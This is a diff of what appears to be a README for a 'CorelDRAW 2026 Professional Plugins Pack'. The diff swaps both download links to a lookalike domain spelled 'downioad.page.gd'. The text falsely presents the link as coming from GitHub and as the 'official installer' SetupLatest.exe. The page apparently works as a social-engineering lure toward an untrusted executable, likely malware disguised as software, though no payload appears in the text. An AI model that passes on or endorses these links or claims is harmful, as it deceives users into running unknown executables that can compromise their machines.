@@ -2,7 +2,7 @@
 
 Welcome to the CorelDRAW 2026 Professional Plugins Pack, the essential toolkit for designers seeking to expand CorelDRAW's native features. This pack bundles a variety of plugins, brushes, effects, and templates specifically curated for the 2026 version of CorelDRAW, all optimized for Windows 10 and Windows 11 desktop environments. Whether you're a seasoned professional or a hobbyist, these tools will help streamline your creative workflow and unlock new possibilities in graphic design.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's Inside
 
@@ -69,7 +69,7 @@ This plugins pack was last updated on January 15, 2026, with version 2.1.0. We c
 
 Ready to enhance your CorelDRAW experience? Get the latest version of the plugins pack now.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 Note: This download link provides the official installer file "SetupLatest.exe". Ensure you download only from this source to avoid unauthorized copies.
 
